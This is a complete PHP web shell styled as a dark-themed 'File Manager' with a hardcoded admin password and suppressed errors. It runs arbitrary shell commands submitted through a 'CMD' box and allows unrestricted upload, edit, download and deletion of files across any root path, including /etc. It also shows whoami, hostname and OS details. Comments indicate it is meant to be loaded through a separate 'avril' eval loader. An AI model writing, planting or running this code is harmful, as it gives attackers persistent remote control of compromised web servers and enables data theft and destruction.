<?php
@ob_start();
@error_reporting(0);
@ini_set('display_errors',0);

$AUTH_USER = 'admin';
$AUTH_PASS = 'P@ssw0rd123!';
$SN = 'fm_s';

if(function_exists('session_status')){
    if(session_status()===PHP_SESSION_NONE){ @session_name($SN); @session_start(); }
} else {
    @session_name($SN); @session_start();
}

function _enc($s){ return htmlspecialchars($s, ENT_QUOTES, 'UTF-8'); }

function _safe($base,$rel){
    $base=rtrim(realpath($base),DIRECTORY_SEPARATOR);
    $full=realpath($base.DIRECTORY_SEPARATOR.ltrim($rel,'/\\'));
    if($full===false) $full=$base.DIRECTORY_SEPARATOR.ltrim($rel,'/\\');
    if(strpos($full,$base)!==0) return false;
    return $full;
}

function _hsz($b){
    if($b>=1073741824) return round($b/1073741824,2).' GB';
    if($b>=1048576)    return round($b/1048576,2).' MB';
    if($b>=1024)       return round($b/1024,2).' KB';
    return $b.' B';
}

function _icon($n,$d){
    if($d) return '[D]';
    $e=strtolower(pathinfo($n,PATHINFO_EXTENSION));
    $m=array('php'=>'[P]','html'=>'[H]','js'=>'[J]','css'=>'[C]',
             'jpg'=>'[I]','jpeg'=>'[I]','png'=>'[I]','gif'=>'[I]',
             'zip'=>'[Z]','tar'=>'[Z]','gz'=>'[Z]','sql'=>'[S]',
             'txt'=>'[T]','log'=>'[L]','sh'=>'[SH]','py'=>'[PY]');
    return isset($m[$e])?$m[$e]:'[F]';
}

function _istxt($p){
    $e=strtolower(pathinfo($p,PATHINFO_EXTENSION));
    return in_array($e,array('php','html','htm','js','css','txt','md','log',
        'sh','py','rb','sql','json','xml','csv','conf','ini','env','yaml','yml'));
}

function _rrmdir($d){
    foreach(scandir($d) as $f){
        if($f==='.'||$f==='..') continue;
        $p=$d.DIRECTORY_SEPARATOR.$f;
        is_dir($p)?_rrmdir($p):unlink($p);
    }
    rmdir($d);
}

function show_login($err=''){
    @ob_end_clean();
    echo '<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Login</title><style>';
    echo '*{box-sizing:border-box;margin:0;padding:0}';
    echo 'body{background:#0f1117;color:#c9d1d9;font-family:sans-serif;display:flex;height:100vh;align-items:center;justify-content:center}';
    echo '.b{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:32px 36px;min-width:300px}';
    echo 'h2{margin-bottom:20px;font-size:18px;text-align:center;color:#f0f6fc}';
    echo 'label{font-size:13px;color:#8b949e;display:block;margin-bottom:4px}';
    echo 'input{width:100%;background:#21262d;border:1px solid #30363d;color:#c9d1d9;padding:8px 10px;border-radius:5px;font-size:14px;margin-bottom:14px}';
    echo 'button{width:100%;background:#238636;border:none;color:#fff;padding:9px;border-radius:5px;cursor:pointer;font-size:14px}';
    echo '.e{color:#f85149;font-size:13px;margin-bottom:12px;text-align:center}';
    echo '</style></head><body><div class="b"><h2>File Manager</h2>';
    if($err) echo '<div class="e">'.htmlspecialchars($err).'</div>';
    echo '<form method="post"><label>Username</label><input type="text" name="u" autofocus autocomplete="off">';
    echo '<label>Password</label><input type="password" name="p"><button type="submit">Login</button></form>';
    echo '</div></body></html>';
}

// ── auth ─────────────────────────────────────────────────────────
if(isset($_POST['logout'])){
    $_SESSION=array(); @session_destroy();
    @ob_end_clean();
    $_via_avril_lo = isset($_GET['f']) ? $_GET['f'] : (isset($_GET['run']) ? $_GET['run'] : null);
    $loc = $_SERVER['PHP_SELF'].($_via_avril_lo ? '?f='.urlencode($_via_avril_lo) : '');
    header('Location: '.$loc); exit;
}
if(!isset($_SESSION['auth'])){
    if(isset($_POST['u'],$_POST['p'])&&$_POST['u']===$AUTH_USER&&$_POST['p']===$AUTH_PASS){
        $_SESSION['auth']=true;
    } else {
        show_login(isset($_POST['u'])?'Invalid credentials':'');
        exit;
    }
}

// ── root / cwd ────────────────────────────────────────────────────
$root=isset($_GET['root'])?$_GET['root']:(isset($_SERVER['DOCUMENT_ROOT'])?$_SERVER['DOCUMENT_ROOT']:dirname(__FILE__));
if(!is_dir($root)) $root=dirname(__FILE__);
$rr=realpath($root);
$root=rtrim($rr!==false?$rr:$root,DIRECTORY_SEPARATOR);

$rel=isset($_GET['d'])?$_GET['d']:'';
$cwd=_safe($root,$rel);
if(!$cwd||!is_dir($cwd)){ $cwd=$root; $rel=''; }

// Detect jika di-eval via avril (?f= atau ?run=)
// Kalau iya, semua link harus tetap lewat avril
$_via_avril = isset($_GET['f']) ? $_GET['f'] : (isset($_GET['run']) ? $_GET['run'] : null);
if($_via_avril){
    // self = avril.php, dengan ?f=<fm_url> prefix
    $self=$_SERVER['PHP_SELF'];
    $qb='?f='.urlencode($_via_avril).'&root='.urlencode($root).'&d='.urlencode($rel);
} else {
    $self=$_SERVER['PHP_SELF'];
    $qb='?root='.urlencode($root).'&d='.urlencode($rel);
}
$msg='';

// ── actions ───────────────────────────────────────────────────────
if(isset($_POST['cmd'])&&$_POST['cmd']!==''){
    $out=shell_exec($_POST['cmd'].' 2>&1');
    $msg='<pre class="co">'.htmlspecialchars($out!==null?$out:'(no output)').'</pre>';
}

if(isset($_FILES['upload'])&&$_FILES['upload']['error']===0){
    $dest=$cwd.DIRECTORY_SEPARATOR.basename($_FILES['upload']['name']);
    $msg=move_uploaded_file($_FILES['upload']['tmp_name'],$dest)?
        '<div class="ok">Uploaded.</div>':'<div class="er">Upload failed.</div>';
}

if(isset($_POST['mkdir'])&&$_POST['mkdir']!==''){
    $nd=$cwd.DIRECTORY_SEPARATOR.basename($_POST['mkdir']);
    $msg=@mkdir($nd,0755)?'<div class="ok">Created.</div>':'<div class="er">Failed.</div>';
}

if(isset($_POST['mkfile'])&&$_POST['mkfile']!==''){
    $nf=$cwd.DIRECTORY_SEPARATOR.basename($_POST['mkfile']);
    $msg=(@file_put_contents($nf,'')!==false)?'<div class="ok">Created.</div>':'<div class="er">Failed.</div>';
}

if(isset($_GET['del'])){
    $dp=_safe($root,$_GET['del']);
    if($dp&&file_exists($dp)){
        if(is_dir($dp)){ _rrmdir($dp); $msg='<div class="ok">Deleted.</div>'; }
        else { unlink($dp); $msg='<div class="ok">Deleted.</div>'; }
    }
}

if(isset($_POST['rfrom'],$_POST['rto'])&&$_POST['rfrom']!==''){
    $from=_safe($root,$_POST['rfrom']);
    if($from&&file_exists($from)){
        $to=dirname($from).DIRECTORY_SEPARATOR.basename($_POST['rto']);
        $msg=rename($from,$to)?'<div class="ok">Renamed.</div>':'<div class="er">Failed.</div>';
    }
}

if(isset($_POST['sp'],$_POST['sc'])){
    $sp=_safe($root,$_POST['sp']);
    if($sp&&is_file($sp)){
        $msg=(@file_put_contents($sp,$_POST['sc'])!==false)?
            '<div class="ok">Saved.</div>':'<div class="er">Failed.</div>';
    }
}

if(isset($_GET['dl'])){
    $fp=_safe($root,$_GET['dl']);
    if($fp&&is_file($fp)){
        @ob_end_clean();
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($fp).'"');
        header('Content-Length: '.filesize($fp));
        readfile($fp); exit;
    }
}

if(isset($_GET['vw'])){
    $vp=_safe($root,$_GET['vw']);
    if($vp&&is_file($vp)){
        @ob_end_clean();
        $mime=function_exists('mime_content_type')?mime_content_type($vp):'application/octet-stream';
        header('Content-Type: '.$mime);
        readfile($vp); exit;
    }
}

$ec=null; $er=null;
if(isset($_GET['ed'])){
    $ep=_safe($root,$_GET['ed']);
    if($ep&&is_file($ep)&&_istxt($ep)){ $ec=file_get_contents($ep); $er=$_GET['ed']; }
}

// ── list dir ─────────────────────────────────────────────────────
$dirs=array(); $files=array();
foreach(scandir($cwd) as $f){
    if($f==='.') continue;
    $fp=$cwd.DIRECTORY_SEPARATOR.$f;
    $fr=($rel===''?'':$rel.'/').$f;
    $item=array('n'=>$f,'r'=>$fr,'s'=>is_file($fp)?filesize($fp):0,'m'=>filemtime($fp),'d'=>is_dir($fp));
    if(is_dir($fp)) $dirs[]=$item; else $files[]=$item;
}
function _cmp($a,$b){ return strcasecmp($a['n'],$b['n']); }
usort($dirs,'_cmp'); usort($files,'_cmp');
$entries=array_merge($dirs,$files);

// ── sysinfo ───────────────────────────────────────────────────────
$wo=trim(shell_exec('whoami 2>/dev/null'));
if(!$wo) $wo=trim(shell_exec('echo %USERNAME% 2>nul'));
if(!$wo) $wo='?';
$hn=php_uname('n');
$os=php_uname('s').' '.php_uname('r');
$fd=function_exists('disk_free_space')?_hsz(@disk_free_space($cwd)):'?';

// ── breadcrumb ────────────────────────────────────────────────────
$parts=($rel==='')?array():explode('/',trim(str_replace('\\','/',$rel),'/'));
$crumbs=array(array('l'=>'~','r'=>''));
$cum='';
foreach($parts as $p){
    if($p==='') continue;
    $cum.=($cum===''?'':'/').$p;
    $crumbs[]=array('l'=>_enc($p),'r'=>$cum);
}

// ── quick nav ─────────────────────────────────────────────────────
$dr=isset($_SERVER['DOCUMENT_ROOT'])?$_SERVER['DOCUMENT_ROOT']:'/';
$quick=array('docroot'=>$dr,'thisdir'=>dirname(__FILE__),'/var/www'=>'/var/www','/tmp'=>'/tmp','/etc'=>'/etc','/home'=>'/home','C:\\'=>'C:\\','D:\\'=>'D:\\');

@ob_end_clean();
?><!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>FM - <?php echo _enc($cwd); ?></title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:monospace;background:#0f1117;color:#c9d1d9;font-size:13px}
a{color:#58a6ff;text-decoration:none}a:hover{text-decoration:underline}
.top{background:#161b22;border-bottom:1px solid #30363d;padding:8px 14px;display:flex;align-items:center;gap:10px;flex-wrap:wrap}
.top h1{font-size:14px;color:#f0f6fc}
.si{font-size:11px;color:#8b949e;margin-left:auto}
.si span{color:#58a6ff}
.wrap{display:flex;height:calc(100vh - 42px)}
.sb{width:180px;background:#161b22;border-right:1px solid #30363d;overflow-y:auto;padding:8px 0}
.sb a{display:block;padding:3px 10px;color:#8b949e;font-size:12px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.sb a:hover{background:#1c2128;color:#c9d1d9;text-decoration:none}
.sbh{padding:4px 10px;font-size:10px;color:#6e7681;text-transform:uppercase;margin-top:6px}
.ct{flex:1;overflow-y:auto;padding:12px}
input[type=text],input[type=password],textarea{background:#21262d;border:1px solid #30363d;color:#c9d1d9;padding:4px 7px;border-radius:4px;font-size:13px;font-family:monospace}
button,input[type=submit]{background:#238636;border:none;color:#fff;padding:4px 10px;border-radius:4px;cursor:pointer;font-size:12px}
button:hover{background:#2ea043}
.r{background:#b62324}.r:hover{background:#da3633}
.b{background:#1f6feb}.b:hover{background:#388bfd}
.g{background:#30363d}.g:hover{background:#484f58}
table{width:100%;border-collapse:collapse}
th{background:#161b22;color:#8b949e;font-weight:600;text-align:left;padding:5px 8px;font-size:11px;position:sticky;top:0;border-bottom:1px solid #30363d}
td{padding:4px 8px;border-bottom:1px solid #21262d;white-space:nowrap}
tr:hover td{background:#1c2128}
.fn{max-width:300px;overflow:hidden;text-overflow:ellipsis}
.sz,.mt{color:#8b949e;font-size:11px}
.ac{display:flex;gap:3px;justify-content:flex-end}
.ac a,.ac button{font-size:11px;padding:2px 6px}
.ok{border:1px solid #238636;color:#3fb950;padding:6px 10px;border-radius:4px;margin-bottom:8px}
.er{border:1px solid #b62324;color:#f85149;padding:6px 10px;border-radius:4px;margin-bottom:8px}
.cw{background:#161b22;border:1px solid #30363d;border-radius:5px;padding:10px;margin-bottom:10px}
.cw h3{margin-bottom:6px;font-size:12px;color:#8b949e}
.cf{display:flex;gap:5px}
.cf input{flex:1}
.co{background:#0d1117;border:1px solid #30363d;padding:8px;border-radius:4px;overflow-x:auto;font-size:12px;white-space:pre-wrap;word-break:break-all;max-height:280px;overflow-y:auto;margin-top:6px;color:#3fb950}
.ew{background:#0d1117;border:1px solid #30363d;border-radius:5px;padding:12px}
.ew h3{margin-bottom:6px;font-size:12px;color:#58a6ff}
.ew textarea{width:100%;height:58vh;resize:vertical;font-size:12px;padding:8px}
.ar{display:flex;gap:6px;margin-top:6px}
.bc{display:flex;align-items:center;gap:3px;flex-wrap:wrap;margin-bottom:8px;font-size:12px}
.tb{display:flex;gap:6px;margin-bottom:8px;flex-wrap:wrap}
.tb form{display:flex;gap:3px}
.mb{display:none;position:fixed;inset:0;background:rgba(0,0,0,.7);z-index:100;align-items:center;justify-content:center}
.mb.op{display:flex}
.md{background:#161b22;border:1px solid #30363d;border-radius:7px;padding:18px;min-width:300px}
.md h3{margin-bottom:10px;font-size:13px}
.md input{width:100%;margin-bottom:8px}
.md .rw{display:flex;gap:6px;justify-content:flex-end}
</style>
</head>
<body>
<div class="top">
  <h1>FM</h1>
  <form method="get" action="<?php echo $self; ?>">
    <input type="hidden" name="d" value="">
    <?php if($_via_avril): ?><input type="hidden" name="f" value="<?php echo _enc($_via_avril); ?>"><?php endif; ?>
    <input type="text" name="root" value="<?php echo _enc($root); ?>" style="width:220px" placeholder="root path">
    <button type="submit" class="b">Go</button>
  </form>
  <form method="post" action="<?php echo $self.$qb; ?>">
    <button type="submit" name="logout" value="1" class="r">Logout</button>
  </form>
  <div class="si">
    <span><?php echo _enc($wo); ?></span>@<span><?php echo _enc($hn); ?></span> |
    PHP <span><?php echo PHP_VERSION; ?></span> |
    <span><?php echo _enc($os); ?></span> |
    Free: <span><?php echo $fd; ?></span>
  </div>
</div>

<div class="wrap">
<div class="sb">
  <div class="sbh">Quick</div>
  <?php foreach($quick as $ql=>$qp): ?>
    <?php if(is_dir($qp)): ?>
    <a href="<?php echo _enc($self.'?'.($_via_avril?'f='.urlencode($_via_avril).'&':'').'root='.urlencode($qp).'&d='); ?>" title="<?php echo _enc($qp); ?>"><?php echo _enc($ql); ?></a>
    <?php endif; ?>
  <?php endforeach; ?>
  <div class="sbh">Subdirs</div>
  <?php foreach(scandir($cwd) as $sf): ?>
    <?php if($sf==='.'||$sf==='..') continue; ?>
    <?php $sfp=$cwd.DIRECTORY_SEPARATOR.$sf; if(!is_dir($sfp)) continue; ?>
    <?php $sfr=($rel===''?'':$rel.'/').$sf; ?>
    <a href="<?php echo _enc($self.'?'.($_via_avril?'f='.urlencode($_via_avril).'&':'').'root='.urlencode($root).'&d='.urlencode($sfr)); ?>" title="<?php echo _enc($sf); ?>">[D] <?php echo _enc($sf); ?></a>
  <?php endforeach; ?>
</div>

<div class="ct">
<?php if($msg) echo $msg; ?>

<?php if($ec!==null): ?>
<div class="ew">
  <h3>Edit: <?php echo _enc($er); ?></h3>
  <form method="post" action="<?php echo _enc($self.$qb); ?>">
    <input type="hidden" name="sp" value="<?php echo _enc($er); ?>">
    <textarea name="sc"><?php echo _enc($ec); ?></textarea>
    <div class="ar">
      <button type="submit">Save</button>
      <a href="<?php echo _enc($self.$qb); ?>"><button type="button" class="g">Cancel</button></a>
    </div>
  </form>
</div>
<?php else: ?>

<div class="cw">
  <h3>CMD</h3>
  <form method="post" action="<?php echo _enc($self.$qb); ?>">
    <div class="cf">
      <input type="text" name="cmd" placeholder="id; whoami; ls -la" autocomplete="off" autofocus>
      <button type="submit">Run</button>
    </div>
  </form>
  <?php if($msg&&strpos($msg,'co')!==false) echo $msg; ?>
</div>

<div class="cw">
  <h3>Upload to: <?php echo _enc($cwd); ?></h3>
  <form method="post" enctype="multipart/form-data" action="<?php echo _enc($self.$qb); ?>">
    <div class="cf">
      <input type="file" name="upload" style="color:#c9d1d9">
      <button type="submit">Upload</button>
    </div>
  </form>
</div>

<div class="bc">
  <?php foreach($crumbs as $ci=>$cc): ?>
    <?php if($ci<count($crumbs)-1): ?>
      <a href="<?php echo _enc($self.'?'.($_via_avril?'f='.urlencode($_via_avril).'&':'').'root='.urlencode($root).'&d='.urlencode($cc['r'])); ?>"><?php echo $cc['l']; ?></a>
      <span>/</span>
    <?php else: ?>
      <span style="color:#c9d1d9"><?php echo $cc['l']; ?></span>
    <?php endif; ?>
  <?php endforeach; ?>
  <span style="color:#8b949e;font-size:11px">(<?php echo _enc($cwd); ?>)</span>
</div>

<div class="tb">
  <form method="post" action="<?php echo _enc($self.$qb); ?>">
    <input type="text" name="mkdir" placeholder="New folder">
    <button type="submit">[D] Create</button>
  </form>
  <form method="post" action="<?php echo _enc($self.$qb); ?>">
    <input type="text" name="mkfile" placeholder="New file">
    <button type="submit">[F] Create</button>
  </form>
</div>

<table>
<thead><tr>
  <th></th><th>Name</th><th>Size</th><th>Modified</th><th style="text-align:right">Actions</th>
</tr></thead>
<tbody>
<?php foreach($entries as $e): ?>
  <?php
    $_fp=$_via_avril?'f='.urlencode($_via_avril).'&':'';
    $hd=$self.'?'.$_fp.'root='.urlencode($root).'&d='.urlencode($e['r']);
    $he=$self.'?'.$_fp.'root='.urlencode($root).'&d='.urlencode($rel).'&ed='.urlencode($e['r']);
    $hdl=$self.'?'.$_fp.'root='.urlencode($root).'&d='.urlencode($rel).'&dl='.urlencode($e['r']);
    $hv=$self.'?'.$_fp.'root='.urlencode($root).'&d='.urlencode($rel).'&vw='.urlencode($e['r']);
    $hdel=$self.'?'.$_fp.'root='.urlencode($root).'&d='.urlencode($rel).'&del='.urlencode($e['r']);
    $rp=($e['n']==='..') ? (dirname($rel)==='.'?'':dirname($rel)) : null;
  ?>
  <tr>
    <td><?php echo _icon($e['n'],$e['d']); ?></td>
    <td class="fn">
      <?php if($e['n']==='..'):?>
        <a href="<?php echo _enc($self.'?'.$_fp.'root='.urlencode($root).'&d='.urlencode($rp!==null?$rp:'')); ?>">.. (up)</a>
      <?php elseif($e['d']):?>
        <a href="<?php echo _enc($hd); ?>"><?php echo _enc($e['n']); ?></a>
      <?php else:?>
        <?php echo _enc($e['n']); ?>
      <?php endif;?>
    </td>
    <td class="sz"><?php echo $e['d']?'—':_hsz($e['s']); ?></td>
    <td class="mt"><?php echo date('y-m-d H:i',$e['m']); ?></td>
    <td>
      <?php if($e['n']!=='..'):?>
      <div class="ac">
        <?php if(!$e['d']&&_istxt($cwd.DIRECTORY_SEPARATOR.$e['n'])):?>
          <a href="<?php echo _enc($he);?>"><button class="b">Edit</button></a>
        <?php endif;?>
        <?php if(!$e['d']):?>
          <a href="<?php echo _enc($hdl);?>"><button class="g">DL</button></a>
          <a href="<?php echo _enc($hv);?>" target="_blank"><button class="g">View</button></a>
        <?php endif;?>
        <button class="g" onclick="oR('<?php echo _enc(addslashes($e['r']));?>','<?php echo _enc(addslashes($e['n']));?>')">Ren</button>
        <a href="<?php echo _enc($hdel);?>" onclick="return confirm('Delete?')"><button class="r">Del</button></a>
      </div>
      <?php endif;?>
    </td>
  </tr>
<?php endforeach; ?>
</tbody>
</table>
<?php endif; ?>
</div>
</div>

<div class="mb" id="rm">
  <div class="md">
    <h3>Rename</h3>
    <form method="post" action="<?php echo _enc($self.$qb); ?>">
      <input type="hidden" name="rfrom" id="rf">
      <input type="text" name="rto" id="rt" placeholder="New name">
      <div class="rw" style="margin-top:8px">
        <button type="button" class="g" onclick="cR()">Cancel</button>
        <button type="submit">Rename</button>
      </div>
    </form>
  </div>
</div>
<script>
function oR(r,n){document.getElementById('rf').value=r;document.getElementById('rt').value=n;document.getElementById('rm').className='mb op';document.getElementById('rt').focus();}
function cR(){document.getElementById('rm').className='mb';}
document.getElementById('rm').onclick=function(e){if(e.target===this)cR();};
document.onkeydown=function(e){if(e.key==='Escape')cR();};
</script>
</body>
</html>
